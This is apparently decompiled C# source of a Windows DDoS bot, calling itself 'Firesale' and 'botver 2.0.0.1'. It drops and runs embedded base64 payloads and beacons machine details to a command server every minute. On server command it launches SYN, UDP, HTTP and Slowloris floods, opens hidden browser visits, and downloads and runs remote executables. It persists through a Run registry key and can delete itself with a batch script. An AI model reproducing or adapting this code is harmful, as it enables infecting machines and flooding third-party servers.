using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class vWhbtcyitzvHYnuvGdYCEjq
{
	private static Thread KSHmiiglXdkCcbrhkcBeJHo = new Thread(dxnesDllYYzIVwRvUlxmjdv);

	private static MD5 QufaPjaRepYXLwYuHVDUGLk = new MD5CryptoServiceProvider();

	[STAThread]
	public static void Main()
	{
		try
		{
			KSHmiiglXdkCcbrhkcBeJHo.Start();
			ResourceManager resourceManager = new ResourceManager("ZTliGbzGCOR", Assembly.GetExecutingAssembly());
			object resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)resourceSet).GetEnumerator();
				DictionaryEntry dictionaryEntry = default(DictionaryEntry);
				while (enumerator.MoveNext())
				{
					object current = enumerator.Current;
					DictionaryEntry dictionaryEntry2 = ((current != null) ? ((DictionaryEntry)current) : dictionaryEntry);
					byte[] array = Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(Conversions.ToString(dictionaryEntry2.Key))));
					FileStream fileStream = new FileStream(Conversions.ToString(Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key)), FileMode.Create);
					fileStream.Write(array, 0, array.Length);
					fileStream.Close();
					NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key) }, (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void dxnesDllYYzIVwRvUlxmjdv()
	{
		while (true)
		{
			try
			{
				string rFgBfEVhWTNfczjtzvIYZuw = "&pcname=" + Environment.MachineName + "&botver=2.0.0.1&winver=" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + " (x" + Conversions.ToString(tRjJjuoHqNwINJVmBJKTrlP()) + ")&hwid=" + RxEXfVBvwuzkryPppFvxpPr();
				string text = duJRSbytXZGMfndJEFDIszH("www.zippyshare.comconnect.php", rFgBfEVhWTNfczjtzvIYZuw);
				string empty = string.Empty;
				WUCqLCsGRzymmOWiLeKhzMz();
				ICURnXiokvNOjluSycsZfyH();
				if (text.Length != 0 && Operators.CompareString(text, empty, false) != 0)
				{
					iOJKINxqxcDoFILDcFjUPEY(text);
					empty = text;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(60000);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void iOJKINxqxcDoFILDcFjUPEY(string PGTeNMzlNjvKrJuyZNLFXUq)
	{
		string[] array = PGTeNMzlNjvKrJuyZNLFXUq.Split(new char[1] { '*' });
		try
		{
			if (PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!SYN"))
			{
				try
				{
					LttggIQdFZEctGurlEBXHSY.VrESzRDHhVTNfcyUtyuHKZu = array[1];
					LttggIQdFZEctGurlEBXHSY.hjbBQIsacwZerDXkYKlIHiQ = Convert.ToInt32(array[2]);
					LttggIQdFZEctGurlEBXHSY.ztMuSCMSOaqGNPYvqUWDJck = Convert.ToInt32(array[3]);
					LttggIQdFZEctGurlEBXHSY.YJqsNpuJFnBabCLXzTxWoOo = Convert.ToInt32(array[4]);
					LttggIQdFZEctGurlEBXHSY.ZFBBzFpwEUutKzDuTwbZHvQ();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!UDP"))
			{
				try
				{
					QpFwhPRlOTgdMZyyajvXrWu.lhswLghrBvZpIcvpfLUUSXJ = array[1];
					QpFwhPRlOTgdMZyyajvXrWu.CJnzzPTWOmCueMPjMQeoKXK = Convert.ToInt32(array[2]);
					QpFwhPRlOTgdMZyyajvXrWu.wktSMprYsxGvbkkjnLSZEQQ = Convert.ToInt32(array[3]);
					QpFwhPRlOTgdMZyyajvXrWu.wYtsVDUGKjKVPheCXvnkvNb = 1024;
					QpFwhPRlOTgdMZyyajvXrWu.gjmeDSLucfzcguranNNowJl = 1024;
					QpFwhPRlOTgdMZyyajvXrWu.FkJazalfxhEnyEBMdrzBKid();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!HTTP-GET"))
			{
				try
				{
					UlzVJSpkOQwRWeUzJJHMjqx.iHBegNTmukQLMKPzHOeGFVL = array[1];
					UlzVJSpkOQwRWeUzJJHMjqx.skgsJYthqOJmoVpuDsYghfk = Convert.ToInt32(array[2]);
					UlzVJSpkOQwRWeUzJJHMjqx.wshCriwHppcPqNZnVmYcCqn = Convert.ToInt32(array[3]);
					UlzVJSpkOQwRWeUzJJHMjqx.ouOWLqmmlpbUbGgSilogFiN = false;
					UlzVJSpkOQwRWeUzJJHMjqx.NFeHljRGaRIWgPOCCdlxatZ = GEJgnuYlkBFIyYngQxzVxCQ.MuJiiJSeHaGdvVvHBTDZJTZ();
					UlzVJSpkOQwRWeUzJJHMjqx.xPbPNHZWscntpBSTopzXEhw = GEJgnuYlkBFIyYngQxzVxCQ.VhyNVWfDxbdKQjrhNIJHMwE();
					UlzVJSpkOQwRWeUzJJHMjqx.IPWBNNcgjazPIrZcwZdrnXk();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!HTTP-POST"))
			{
				try
				{
					UlzVJSpkOQwRWeUzJJHMjqx.iHBegNTmukQLMKPzHOeGFVL = array[1];
					UlzVJSpkOQwRWeUzJJHMjqx.skgsJYthqOJmoVpuDsYghfk = Convert.ToInt32(array[2]);
					UlzVJSpkOQwRWeUzJJHMjqx.wshCriwHppcPqNZnVmYcCqn = Convert.ToInt32(array[3]);
					UlzVJSpkOQwRWeUzJJHMjqx.ouOWLqmmlpbUbGgSilogFiN = true;
					UlzVJSpkOQwRWeUzJJHMjqx.NFeHljRGaRIWgPOCCdlxatZ = GEJgnuYlkBFIyYngQxzVxCQ.MuJiiJSeHaGdvVvHBTDZJTZ();
					UlzVJSpkOQwRWeUzJJHMjqx.xPbPNHZWscntpBSTopzXEhw = GEJgnuYlkBFIyYngQxzVxCQ.VhyNVWfDxbdKQjrhNIJHMwE();
					UlzVJSpkOQwRWeUzJJHMjqx.IPWBNNcgjazPIrZcwZdrnXk();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			if (PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!SLOWRIS-FLOOD"))
			{
				try
				{
					LttggIQdFZEctGurlEBXHSY.VrESzRDHhVTNfcyUtyuHKZu = array[1];
					LttggIQdFZEctGurlEBXHSY.hjbBQIsacwZerDXkYKlIHiQ = Convert.ToInt32(array[2]);
					LttggIQdFZEctGurlEBXHSY.ztMuSCMSOaqGNPYvqUWDJck = 1;
					LttggIQdFZEctGurlEBXHSY.YJqsNpuJFnBabCLXzTxWoOo = 1;
					LttggIQdFZEctGurlEBXHSY.ZFBBzFpwEUutKzDuTwbZHvQ();
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			if (PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!VISIT-PAGE"))
			{
				try
				{
					if (Operators.CompareString(array[2], "0", false) == 0)
					{
						if (!array[1].StartsWith("http://"))
						{
							array[1] = "http://" + array[1];
						}
						Process.Start(array[1]);
					}
					else
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.FileName = "iexplore.exe";
						processStartInfo.Arguments = array[1];
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo);
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!DOWNLOAD"))
			{
				try
				{
					WUCqLCsGRzymmOWiLeKhzMz();
					naNoKJlTkWazalfxuSnMEBM(array[1]);
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
			}
			if (!PGTeNMzlNjvKrJuyZNLFXUq.StartsWith("!UPDATE-BOTS"))
			{
				return;
			}
			try
			{
				WUCqLCsGRzymmOWiLeKhzMz();
				if (ggwzDuTibLsvQswLIqEddFN())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey.DeleteValue("Firesale");
					registryKey.Close();
				}
				else
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey2.DeleteValue("Firesale");
					registryKey2.Close();
				}
				naNoKJlTkWazalfxuSnMEBM(array[1]);
				ProjectData.EndApp();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
	}

	public static void WUCqLCsGRzymmOWiLeKhzMz()
	{
		try
		{
			LttggIQdFZEctGurlEBXHSY.ULZjSSFFgoCdwcBSeSQKcZv();
			QpFwhPRlOTgdMZyyajvXrWu.GIouOWMrmnlqbipGhgwmogG();
			UlzVJSpkOQwRWeUzJJHMjqx.KKltGiChFXwXicueBkvBwJa();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void SvJIYcfWvLDnVXsVZnxSgTG()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Firesale.exe"))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Firesale.exe", overwrite: true);
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Firesale.exe");
				if (ggwzDuTibLsvQswLIqEddFN())
				{
					RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					registryKey.SetValue("Firesale", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Firesale.exe");
				}
				else
				{
					RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					registryKey2.SetValue("Firesale", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Firesale.exe");
				}
				Environment.Exit(0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string RxEXfVBvwuzkryPppFvxpPr()
	{
		return YWQifCYwCyKNcxyISNqGZsM(Environment.UserName.ToString() + Environment.ProcessorCount + Environment.MachineName.ToString() + Environment.Version.ToString() + Conversions.ToString(tRjJjuoHqNwINJVmBJKTrlP()) + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString());
	}

	public static string YWQifCYwCyKNcxyISNqGZsM(string HvbkljoZSaERQgkmeETLvdf)
	{
		byte[] array = QufaPjaRepYXLwYuHVDUGLk.ComputeHash(Encoding.Default.GetBytes(HvbkljoZSaERQgkmeETLvdf));
		return BitConverter.ToString(array).Replace("-", "").ToUpper();
	}

	public static bool ggwzDuTibLsvQswLIqEddFN()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (UnauthorizedAccessException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static int tRjJjuoHqNwINJVmBJKTrlP()
	{
		return checked(Marshal.SizeOf(typeof(IntPtr)) * 8);
	}

	public static string duJRSbytXZGMfndJEFDIszH(string lMLbRUMkOsqYNhXOcmVVIIj, string rFgBfEVhWTNfczjtzvIYZuw)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamReader streamReader = default(StreamReader);
		WebResponse response = default(WebResponse);
		WebRequest webRequest = default(WebRequest);
		byte[] bytes = default(byte[]);
		Stream requestStream = default(Stream);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 281:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_001b;
						case 5:
							goto IL_0029;
						case 6:
							goto IL_0037;
						case 7:
							goto IL_0046;
						case 8:
							goto IL_0053;
						case 9:
							goto IL_005e;
						case 10:
							goto IL_006e;
						case 11:
							goto IL_0079;
						case 12:
							goto IL_0085;
						case 13:
							goto IL_008d;
						case 14:
						case 15:
							goto IL_0098;
						case 16:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0098:
					num = 15;
					streamReader = new StreamReader(response.GetResponseStream());
					break;
					IL_0008:
					num = 2;
					ServicePointManager.Expect100Continue = false;
					goto IL_0011;
					IL_0011:
					num = 3;
					webRequest = WebRequest.Create(lMLbRUMkOsqYNhXOcmVVIIj);
					goto IL_001b;
					IL_001b:
					num = 4;
					webRequest.ContentType = "application/x-www-form-urlencoded";
					goto IL_0029;
					IL_0029:
					num = 5;
					webRequest.Method = "POST";
					goto IL_0037;
					IL_0037:
					num = 6;
					bytes = Encoding.ASCII.GetBytes(rFgBfEVhWTNfczjtzvIYZuw);
					goto IL_0046;
					IL_0046:
					num = 7;
					webRequest.ContentLength = bytes.Length;
					goto IL_0053;
					IL_0053:
					num = 8;
					requestStream = webRequest.GetRequestStream();
					goto IL_005e;
					IL_005e:
					num = 9;
					requestStream.Write(bytes, 0, bytes.Length);
					goto IL_006e;
					IL_006e:
					num = 10;
					requestStream.Close();
					goto IL_0079;
					IL_0079:
					num = 11;
					response = webRequest.GetResponse();
					goto IL_0085;
					IL_0085:
					num = 12;
					if (response == null)
					{
						goto IL_008d;
					}
					goto IL_0098;
					IL_008d:
					num = 13;
					text = null;
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 16;
				text = streamReader.ReadToEnd().Trim();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 281;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void naNoKJlTkWazalfxuSnMEBM(string ntpCShoqzXSvxekEMChccbg)
	{
		Process process = new Process();
		WebClient webClient = new WebClient();
		string text = nNYSkhFayrnyQeznxVQsubv(8) + ".exe";
		try
		{
			webClient.DownloadFile(ntpCShoqzXSvxekEMChccbg, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool SOaqGbPYvqUWDWckZFOPNSp(string RYfvWVlbeWuYDBiXriZmwff)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 56:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = Process.GetProcessesByName(RYfvWVlbeWuYDBiXriZmwff).Length >= 1;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 56;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private static object drNBKicGIoJOWMrBBzEbipU(string TTtDPrLqOgsgeYqnKtEKGSj)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 102:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0031;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0023:
					num = 4;
					process.CloseMainWindow();
					num5 = checked(num5 + 1);
					goto IL_0031;
					IL_0008:
					num = 2;
					processesByName = Process.GetProcessesByName(TTtDPrLqOgsgeYqnKtEKGSj);
					num5 = 0;
					goto IL_0034;
					IL_0034:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001a;
					}
					goto end_IL_0000_2;
					IL_0031:
					num = 5;
					goto IL_0034;
					IL_001a:
					num = 3;
					process.Kill();
					goto IL_0023;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 102;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static void ncwnerClkYKlIUiQhTXxljd()
	{
		try
		{
			string text = nNYSkhFayrnyQeznxVQsubv(5) + ".bat";
			FileInfo fileInfo = new FileInfo(Application.get_StartupPath());
			fileInfo.Attributes = FileAttributes.Normal;
			string text2 = Interaction.Environ("TEMP") + "\\" + text;
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text2))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			StreamWriter streamWriter = new StreamWriter(text2, append: false);
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine(":L1");
			streamWriter.WriteLine("del \"" + Application.get_ExecutablePath() + "\" 2>nul");
			streamWriter.WriteLine("if exist \"" + Application.get_ExecutablePath() + "\" goto L1");
			streamWriter.WriteLine("del \"" + text2 + "\" 2>nul");
			streamWriter.Close();
			Interaction.Shell(text2, (AppWinStyle)0, false, -1);
			Application.Exit();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static string nNYSkhFayrnyQeznxVQsubv(int qotflsKkjzpsjJlRPwlGvmB)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		StringBuilder stringBuilder = default(StringBuilder);
		char[] array = default(char[]);
		int num6 = default(int);
		int num7 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 212:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_001e;
						case 5:
							goto IL_002c;
						case 6:
							goto IL_0036;
						case 7:
							goto IL_003e;
						case 8:
							goto IL_0066;
						case 9:
							goto IL_0074;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0074:
					num = 9;
					num5 = checked(num5 + 1);
					goto IL_007c;
					IL_0008:
					num = 2;
					VBMath.Randomize();
					goto IL_0010;
					IL_0010:
					num = 3;
					stringBuilder = new StringBuilder("");
					goto IL_001e;
					IL_001e:
					num = 4;
					array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
					goto IL_002c;
					IL_002c:
					num = 5;
					num6 = qotflsKkjzpsjJlRPwlGvmB;
					num5 = 1;
					goto IL_007c;
					IL_007c:
					if (num5 > num6)
					{
						break;
					}
					goto IL_0036;
					IL_0036:
					num = 6;
					VBMath.Randomize();
					goto IL_003e;
					IL_003e:
					num = 7;
					num7 = checked((int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f));
					goto IL_0066;
					IL_0066:
					num = 8;
					stringBuilder.Append(array[num7]);
					goto IL_0074;
					end_IL_0000_2:
					break;
				}
				num = 10;
				text = stringBuilder.ToString();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 212;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int pFxhPSmPThrNaNzbxvYGXJN(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);

	public static void ICURnXiokvNOjluSycsZfyH()
	{
		try
		{
			GC.Collect();
			GC.WaitForPendingFinalizers();
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				pFxhPSmPThrNaNzbxvYGXJN(Process.GetCurrentProcess().Handle, -1, -1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
